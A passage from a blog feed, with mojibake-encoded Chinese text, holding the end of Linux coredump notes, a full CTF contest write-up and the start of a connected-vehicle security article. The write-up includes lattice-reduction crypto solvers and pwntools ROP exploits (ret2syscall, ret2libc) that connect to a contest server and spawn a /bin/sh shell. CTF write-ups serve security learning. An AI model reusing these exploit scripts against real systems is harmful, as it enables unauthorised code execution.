</code>æŒ‡å®šcoredumpæ–‡ä»¶å­˜å‚¨çš„ä½ç½®ï¼Œç¼ºçœå€¼æ˜¯coreï¼Œè¡¨ç¤ºå°†coredumpæ–‡ä»¶å­˜å‚¨åˆ°å½“å‰ç›®å½•ã€‚è¿™ä¸ªpatternæ˜¯å¯ä»¥å®šåˆ¶çš„ï¼Œæ¨¡å¼å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">%p  è¿›ç¨‹çš„PID<br>%u  è¿›ç¨‹çš„UID<br>%s  é€ æˆcoredumpçš„signalå·<br>%t  coredumpç”Ÿæˆçš„æ—¶é—´ï¼Œä»<span class="hljs-number">1970</span>-01-01 <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>å¼€å§‹çš„ç§’æ•°<br>%e  å‡ºCoreè¿›ç¨‹å¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶å<br></code></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼š<code>echo &quot;/corefile/core-%e-%p-%t&quot; &gt; /proc/sys/kernel/core_pattern</code>ï¼Œè¡¨ç¤ºcoredumpè·¯å¾„ä¸º/corefileï¼Œæ–‡ä»¶åçš„æ ¼å¼ä¸ºâ€core-å¯æ‰§è¡Œæ–‡ä»¶å-pid-æ—¶é—´â€ã€‚</p><p><code>/proc/sys/kernel/core_uses_pid</code> å–å€¼æ˜¯0æˆ–è€…1ï¼Œè¡¨ç¤ºæ˜¯å¦åœ¨coredumpæ–‡ä»¶åå­—åé¢åŠ ä¸Šè¿›ç¨‹å·</p><h4 id="coredumpæ–‡ä»¶ä¼šæŠŠè¿›ç¨‹åœ°å€ç©ºé—´çš„å“ªäº›å†…å®¹ä¿å­˜ä¸‹æ¥"><a href="#coredumpæ–‡ä»¶ä¼šæŠŠè¿›ç¨‹åœ°å€ç©ºé—´çš„å“ªäº›å†…å®¹ä¿å­˜ä¸‹æ¥" class="headerlink" title="coredumpæ–‡ä»¶ä¼šæŠŠè¿›ç¨‹åœ°å€ç©ºé—´çš„å“ªäº›å†…å®¹ä¿å­˜ä¸‹æ¥"></a>coredumpæ–‡ä»¶ä¼šæŠŠè¿›ç¨‹åœ°å€ç©ºé—´çš„å“ªäº›å†…å®¹ä¿å­˜ä¸‹æ¥</h4><p><code>/proc/$pid/coredump_filter</code> è®¾ç½®é‚£äº›å†…å­˜ä¼šè¢«dumpå‡ºæ¥ï¼Œéœ€è¦åœ¨ç¨‹åºå¯åŠ¨ä¹‹åè¿›è¡Œè®¾ç½®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">bit <span class="hljs-number">0</span>  Dump anonymous private mappings.<br>bit <span class="hljs-number">1</span>  Dump anonymous shared mappings.<br>bit <span class="hljs-number">2</span>  Dump file-backed private mappings.<br>bit <span class="hljs-number">3</span>  Dump file-backed shared mappings.<br>bit <span class="hljs-number">4</span> (since Linux <span class="hljs-number">2.6</span><span class="hljs-number">.24</span>) Dump ELF headers.<br>bit <span class="hljs-number">5</span> (since Linux <span class="hljs-number">2.6</span><span class="hljs-number">.28</span>) Dump private huge pages.<br>bit <span class="hljs-number">6</span> (since Linux <span class="hljs-number">2.6</span><span class="hljs-number">.28</span>) Dump shared huge pages.<br></code></pre></td></tr></table></figure><p>coredump_filterçš„é»˜è®¤å€¼æ˜¯0x33ï¼Œä¹Ÿå³å‘ç”Ÿcoredumpæ—¶ä¼šå°†æ‰€æœ‰anonymouså†…å­˜ã€ELFå¤´é¡µé¢ã€hugetlb private memoryå†…å®¹ä¿å­˜ã€‚</p><h4 id="å¦‚ä½•æ§åˆ¶coredumpæ–‡ä»¶çš„å¤§å°"><a href="#å¦‚ä½•æ§åˆ¶coredumpæ–‡ä»¶çš„å¤§å°" class="headerlink" title="å¦‚ä½•æ§åˆ¶coredumpæ–‡ä»¶çš„å¤§å°"></a>å¦‚ä½•æ§åˆ¶coredumpæ–‡ä»¶çš„å¤§å°</h4><p>ulimit -cå†³å®šsaveçš„coredumpæ–‡ä»¶å¤§å°é™åˆ¶ï¼Œå¦‚æœä¿å­˜çš„æ–‡ä»¶å°äºè®¾å®šçš„é™åˆ¶ï¼Œåˆ™ä¸ä¼šåˆ›å»ºcoredumpæ–‡ä»¶ã€‚å¦‚æœä¸æƒ³é™åˆ¶å¤§å°ï¼Œéœ€è¦è®¾ç½®<code>ulimit -c unlimited</code>ã€‚ä½†æ˜¯è¾“å…¥ååªå¯¹æ‰§è¡Œè¿™ä¸ªå‘½ä»¤çš„è¿›ç¨‹ï¼ŒåŠå…¶åé¢forkå‡ºæ¥çš„è¿›ç¨‹æœ‰æ•ˆï¼Œå·²ç»è¿è¡Œçš„è¿›ç¨‹æ— æ•ˆã€‚ä¾‹å¦‚ï¼Œinitè¿›ç¨‹åœ¨æ‰§è¡Œ<code>ulimit -c unlimited</code>ä¹‹å‰ï¼Œè¿è¡Œäº†ä¸€ä¸ªè¿›ç¨‹aï¼Œåˆ™è¿›ç¨‹a crashçš„æ—¶å€™ä¸ä¼šäº§ç”Ÿcoredumpã€‚</p><p>å¤ªçƒ§è„‘äº†ï¼Œä¸‹æ¬¡å†å­¦ã€‚ã€‚ã€‚ã€‚ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç¬¬ä¸‰å±Šå±±çŸ³ç½‘ç§‘å¤ä»¤è¥</title>
    <link href="/2023/08/21/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%B1%B1%E7%9F%B3%E7%BD%91%E7%A7%91%E6%9A%91%E5%81%87CTF%E8%AE%AD%E7%BB%83%E8%90%A5%E7%BB%93%E8%90%A5%E8%B5%9B/"/>
    <url>/2023/08/21/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%B1%B1%E7%9F%B3%E7%BD%91%E7%A7%91%E6%9A%91%E5%81%87CTF%E8%AE%AD%E7%BB%83%E8%90%A5%E7%BB%93%E8%90%A5%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h2><p>ä¸‹ç­ä¹‹ä½™æ¥æ‰“ä¸€åœºç‚¸é±¼èµ›ï¼ˆä¸»è¦å¿ƒæ°´å°ç¤¼å“å“ˆå“ˆå“ˆï¼‰ç¬¬ä¸€æ¬¡æ‘¸åˆ°äº†ç¬¬ä¸€ï¼Œæˆ‘ä¹Ÿæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›ğŸ¥µ</p><p><img src="/mdimg/2023sswk/1.jpg"></p><p>md èšŒåŸ ä½äº† å†¬ä»¤è¥è¿˜æœ‰ä¿æ¸©æ¯å•¥çš„å‘¢ï¼è¿™æ¬¡å±…ç„¶å°±ç»™æˆ‘ä¸€æœ¬ä»0åˆ°1ğŸ˜…åŸåœ°é€ç»™æ–°ç”Ÿå½“çºªå¿µå“äº†ã€‚</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="babyNTRU"><a href="#babyNTRU" class="headerlink" title="babyNTRU"></a>babyNTRU</h3><p>æ ¼åŸºè§„çº¦æ±‚få’Œg</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-number">18265166690888475568508205788351723108492598063556694453866020018612082716314197018581664220266891343266826262103380794092636040577744226926080805739120171556812778934479727248098841525477772831490126199548545786503110837372880363428957764884329593924744941695642013585909156506088780643030023164855973833306872727463131996134184118614172430586758877233701077685751718260071836310060281140572946121079034501926660471152233585368113925178752435191910762241019003537704885083238106369534830393975302288404167836930602217985985847446070323598776341522649183248452794742376328444827351843724799192817079741161233112260479</span><br>h = <span class="hljs-number">4967224096990794383219394548021661512726675694147838134779085870532422860903557980609209611713600051085944165443541629919867486254693404349210710383848787111293470866844887628407505277639836299797939984616893146647351591326606770521678401285613589626410018479980831585926061303904550146343466643582612670862834763887770328979710431031177418547347283523083258882829675470842927115407426622663316454822399636240738287665733629112976904877165355516610469901309760380900426025418466453719738514032928207738877975591007250792160137047114036933809472387873650910438263376962726381797927297555569681381513766206991560665841</span><br>c = <span class="hljs-number">16817585342429374146630376920213715475053842668013412994500648477443919828494694587495599063908719008851497141935769861968183626958443589329598781614352147198572062882796132537628308726395654751145080742405050157500585726017502230322869060570158864938641538722583753556090927664838782228764769369834459631417465435803556700281096974029668813698732758153249834904501478272838991307791205987117636747526652824803482977910064904853019629040285700901775083075557874528402638028712625642698991805017963162010854671654728900722088963013805447853328852730983161366447618298248888612010461342887166024478519281752219951330472</span><br><br>K=<span class="hljs-number">2</span>**(bits//<span class="hljs-number">2</span>-<span class="hljs-number">1</span>)<br>v1 = vector(ZZ, [<span class="hljs-number">1</span>, h*K])<br>v2 = vector(ZZ, [<span class="hljs-number">0</span>, p*K])<br>m = matrix([v1, v2])<br>f, g = m.LLL()[<span class="hljs-number">1</span>]<br>g = g//K<br><span class="hljs-comment">#print(f,g)</span><br><br>a = f * c % p % g<br>m = ZZ(c * f % q) * inverse_mod(f, g) % g<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br><br><span class="hljs-comment">#HSNCTF&#123;d148fc5f-a646-4e60-a739-0bd0be98acd4&#125;</span><br></code></pre></td></tr></table></figure><h3 id="babyHNP"><a href="#babyHNP" class="headerlink" title="babyHNP"></a>babyHNP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">q = <span class="hljs-number">11617715374360202288596693614790746639041280065515420354170463717765818460765992548652144591072405216278802974122732716944329876299701631478958721643071613</span><br>A = [<span class="hljs-number">11205052163260879279779370027300388478563443748738386851258833175732815177918017923156408522968360233660245388669805196022826655093066229550671451036244177</span>, <span class="hljs-number">4587207419689873871671379475501060352361231709208665709260842495737444139113663532344038909684079685643293993271298355108298467058894209863221986043222103</span>, <span class="hljs-number">10892919356115964033441271848254373740150765391546241788365946905744103719741126554964746464277556730869654695377121263714138165633966013875792234902620232</span>, <span class="hljs-number">10388792144961373833428258161261768867774084238986429927755268743714106636512322654152268221431850066914109192294030406670197964112088034757687400251674294</span>, <span class="hljs-number">11168854651301071762033749829324982832429309270098022559190141243813683288587800229160507152432884446347484607384244984898130514154822876542001332189154040</span>]<br>b = [<span class="hljs-number">206397678313339208910331992242857106765</span>, <span class="hljs-number">248314924649425376092667318144109655550</span>, <span class="hljs-number">116605977425896048557273717492096177262</span>, <span class="hljs-number">130883156720507560420446459921008261211</span>, <span class="hljs-number">254134740809858803078213400623952076908</span>]<br><br>a = [ZZ(i*inverse_mod(<span class="hljs-number">2</span>**<span class="hljs-number">128</span>, q)%q) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> A]<br>b = [ZZ(i*inverse_mod(<span class="hljs-number">2</span>**<span class="hljs-number">128</span>, q)%q) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b]<br><br>n = <span class="hljs-number">4</span><br>L0 = matrix(ZZ, <span class="hljs-number">1</span>, n)<br>L1 = matrix(ZZ, <span class="hljs-number">1</span>, n)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    _a0 = inverse_mod(a[<span class="hljs-number">0</span>], q)<br>    L0[<span class="hljs-number">0</span>, i] = ZZ(a[i+<span class="hljs-number">1</span>]*_a0%q)<br>    L1[<span class="hljs-number">0</span>, i] = ZZ((b[<span class="hljs-number">0</span>]*a[i+<span class="hljs-number">1</span>]-b[i+<span class="hljs-number">1</span>]*a[<span class="hljs-number">0</span>])*_a0%q)<br>L = block_matrix([<br>    [<span class="hljs-number">1</span>, L0, <span class="hljs-number">0</span>],<br>    [<span class="hljs-number">0</span>, L1, ZZ(q)],<br>    [<span class="hljs-number">0</span>, ZZ(q), <span class="hljs-number">0</span>]<br>]).LLL()<br><span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> L:<span class="hljs-built_in">print</span>([_.nbits() <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> row])<br>e0 = <span class="hljs-built_in">abs</span>(L[-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>])<br>m = ZZ((b[<span class="hljs-number">0</span>]+e0)*inverse_mod(a[<span class="hljs-number">0</span>], q)%q)<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)))<br><span class="hljs-comment"># HSNCTF&#123;d05dd7e4-9ee0-4ce1-b358-a4e5209555df&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.endian = <span class="hljs-string">&#x27;little&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br>sa = <span class="hljs-keyword">lambda</span> s,n : sh.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : sh.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : sh.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : sh.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : sh.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : sh.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span> s = <span class="hljs-literal">False</span> : sh.recvline(s)<br>ti = <span class="hljs-keyword">lambda</span> : sh.interactive()<br><br>sh = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>sh = remote(<span class="hljs-string">&#x27;58.240.236.231&#x27;</span>, <span class="hljs-number">49003</span>)<br>syscall = <span class="hljs-number">0x0000000000400741</span><br>pop_rdi = <span class="hljs-number">0x000000000040072b</span><br>pop_rsi = <span class="hljs-number">0x0000000000400735</span><br>pop_rdx = <span class="hljs-number">0x000000000040073f</span><br>pop_rax = <span class="hljs-number">0x0000000000400721</span><br><br>rop = p64(pop_rax) + p64(<span class="hljs-number">59</span>)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">0x0000000000601048</span>)<br>rop += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>rop += p64(pop_rdx) + p64(<span class="hljs-number">0</span>)<br>rop += p64(syscall)<br><br>sla(<span class="hljs-string">&#x27;input:&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + rop)<br><br>ti()<br></code></pre></td></tr></table></figure><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.endian = <span class="hljs-string">&#x27;little&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br>sa = <span class="hljs-keyword">lambda</span> s,n : sh.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : sh.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : sh.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : sh.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : sh.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : sh.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span> s = <span class="hljs-literal">False</span> : sh.recvline(s)<br>ti = <span class="hljs-keyword">lambda</span> : sh.interactive()<br><br>sh = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/home/ccc/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)<br>sh = remote(<span class="hljs-string">&#x27;58.240.236.231&#x27;</span>, <span class="hljs-number">49002</span>)<br>pop_rdi = <span class="hljs-number">0x0000000000400783</span><br>pop_rsi2 = <span class="hljs-number">0x0000000000400781</span><br>main = <span class="hljs-number">0x0000000004006FD</span><br>leak = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xd8</span> + p64(pop_rdi) + p64(<span class="hljs-number">0x0000000000601018</span>) + p64(<span class="hljs-number">0x0000000000400520</span>) + p64(main)<br>sla(<span class="hljs-string">&#x27;name:&#x27;</span>, leak)<br><br>libc_base = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>og = libc_base + <span class="hljs-number">0xf1247</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xd8</span> + p64(og)<br>sla(<span class="hljs-string">&#x27;name:&#x27;</span>, payload)<br>ti()<br></code></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="HSAndroid1"><a href="#HSAndroid1" class="headerlink" title="HSAndroid1"></a>HSAndroid1</h3><p>è¿˜ä»¥ä¸ºå’Œå†¬ä»¤è¥ä¸€æ¨¡ä¸€æ ·çš„é¢˜ï¼Œç»“æœçœ‹é”™äº†å¯¹è±¡ã€‚ä¸Šé¢çš„æ··æ·†è¿ç®—æ‰æ˜¯flag</p><p><img src="/mdimg/2023sswk/6.png"></p><p>chatGPTå†™ä¸ªè„šæœ¬å®Œäº‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">charArr = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;0db530c0e9752357b1ae4cf7ea8331ae&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">4</span>):<br>        temp = charArr[j]<br>        charArr[j] = charArr[j - <span class="hljs-number">4</span>]<br>        charArr[j - <span class="hljs-number">4</span>] = temp<br><br>    <br>    temp2 = charArr[i - <span class="hljs-number">1</span>]<br>    charArr[i - <span class="hljs-number">1</span>] = charArr[i - <span class="hljs-number">2</span>]<br>    charArr[i - <span class="hljs-number">2</span>] = temp2<br><br>original_string = <span class="hljs-string">&quot;&quot;</span>.join(charArr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Original String:&quot;</span>, original_string)<br><br><span class="hljs-comment">#hsnctf&#123;d35b300c92570e57b1ae4cf7ea8331ae&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h3><p>è¿™ä¸ªæ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚</p><h3 id="easyusb"><a href="#easyusb" class="headerlink" title="easyusb"></a>easyusb</h3><p>æ¿å­é¢˜ æ³¨æ„æœ‰<code>[CAPS]</code> æ‰€ä»¥è§£å‹å¯†ç ä¸ºå…¨å¤§å†™ è§£å¼€å‹ç¼©åŒ…å°±æ˜¯flag</p><p><img src="/mdimg/2023sswk/7.png"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>ä¸‰ä¸ªåŸé¢˜ï¼Œä¸€ä¸ªä¸å’‹ä¼šwebçš„äººæ‹¿äº†ä¸‰ä¸ªå‰ä¸‰è¡€</p><h3 id="primitive"><a href="#primitive" class="headerlink" title="primitive"></a>primitive</h3><p>ä»Šå¹´å†¬ä»¤è¥ä¸€æ¨¡ä¸€æ ·çš„é¢˜ å‚è€ƒæˆ‘è‡ªå·±çš„åšå®¢</p><p><a href="https://g1at.github.io/2023/02/06/2023%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/#Primitive-php">https://g1at.github.io/2023/02/06/2023%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/#Primitive-php</a></p><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>[BJDCTF2020]åŸé¢˜ï¼Œä½ çŒœæˆ‘æ€ä¹ˆæ‰¾åˆ°çš„ï¼ŒGoogleè¯†å›¾ğŸ˜‚</p><p><a href="https://www.jianshu.com/p/7092f56dcbbc">https://www.jianshu.com/p/7092f56dcbbc</a></p><h3 id="uns"><a href="#uns" class="headerlink" title="uns"></a>uns</h3><p>CTFshowåŸé¢˜   å”¯ä¸€å˜åŒ–å°±æ˜¯admin.phpæ”¹æˆäº†session.php</p><p><a href="https://blog.csdn.net/Kracxi/article/details/122885954">https://blog.csdn.net/Kracxi/article/details/122885954</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IoTå®‰å…¨ä¹‹è½¦è”ç½‘1</title>
    <link href="/2023/08/11/%E8%BD%A6%E8%81%94%E7%BD%911/"/>
    <url>/2023/08/11/%E8%BD%A6%E8%81%94%E7%BD%911/</url>
    
    <content type="html"><![CDATA[<h2 id="è½¦è”ç½‘ç³»ç»Ÿ"><a href="#è½¦è”ç½‘ç³»ç»Ÿ" class="headerlink" title="è½¦è”ç½‘ç³»ç»Ÿ"></a>è½¦è”ç½‘ç³»ç»Ÿ</h2><p>è½¦è”ç½‘ç³»ç»Ÿä¸€èˆ¬åŒ…å«å››éƒ¨åˆ†ï¼š<strong>ä¿¡æ¯å¨±ä¹ç³»ç»Ÿ(IVI)ã€è½¦è½½ç½‘å…³(T-BOX)ã€æ‰‹æœºAPPä»¥åŠäº‘å¹³å°ç³»ç»Ÿ(TSP)</strong></p><p>ä¸åŒå‚å•†çš„è½¦è”ç½‘å®ç°æ¶æ„ä¸åŒï¼Œä½†æ€»ä½“æ¶æ„å¯åˆ†ä¸º4éƒ¨åˆ†ï¼š</p><ol><li>ä¿¡æ¯å¨±ä¹ç³»ç»Ÿ(IVI)</li><li>è½¦è½½ç½‘å…³(TBOX)</li><li>æ‰‹æœºç«¯è½¦è”ç½‘åº”ç”¨(APP)</li><li>è½¦è”ç½‘äº‘å¹³å°æœåŠ¡(TSP)</li></ol><p><strong>IVI</strong>ï¼šè½¦è½½ä¿¡æ¯å¨±ä¹ç³»ç»Ÿ(In-Vehicle Infotainment)ã€‚æ—©æœŸä»¥CDæœºçš„å½¢å¼è¿›è¡ŒéŸ³é¢‘æ’­æ”¾ï¼Œåœ¨è½¦è”ç½‘åŠŸèƒ½æ¨å¹¿åï¼Œç›®å‰çš„è½¦è½½å¨±ä¹ç³»ç»Ÿå¯ä»¥é€šè¿‡èœ‚çªç½‘ç»œæ¥å…¥äº’è”ç½‘ï¼Œå¹¶æä¾›ä»¥ä¸‹å¸¸è§åŠŸèƒ½ï¼šå®æ—¶å¯¼èˆªï¼Œç½‘é¡µæµè§ˆï¼Œè§†é¢‘æ’­æ”¾ï¼Œæ‰‹æœºæŠ•å±ï¼Œè¯­éŸ³æ§è½¦ç­‰ã€‚è½¦è½½ä¿¡æ¯å¨±ä¹ç³»ç»Ÿé€šå¸¸å…·å¤‡ä¸€éƒ¨åˆ†CANæ€»çº¿æ“æ§èƒ½åŠ›ï¼Œå› æ­¤è½¦è½½ä¿¡æ¯å¨±ä¹ç³»ç»Ÿâ€åŠŸèƒ½å¤–æº¢â€ç°è±¡äº§ç”Ÿçš„æ”»å‡»é¢å¾ˆå¯èƒ½ä¼šå¯¼è‡´æ§è½¦æ¼æ´çš„äº§ç”Ÿã€‚</p><p><strong>T-BOX</strong>ï¼šè½¦è½½ç½‘å…³(Telematics 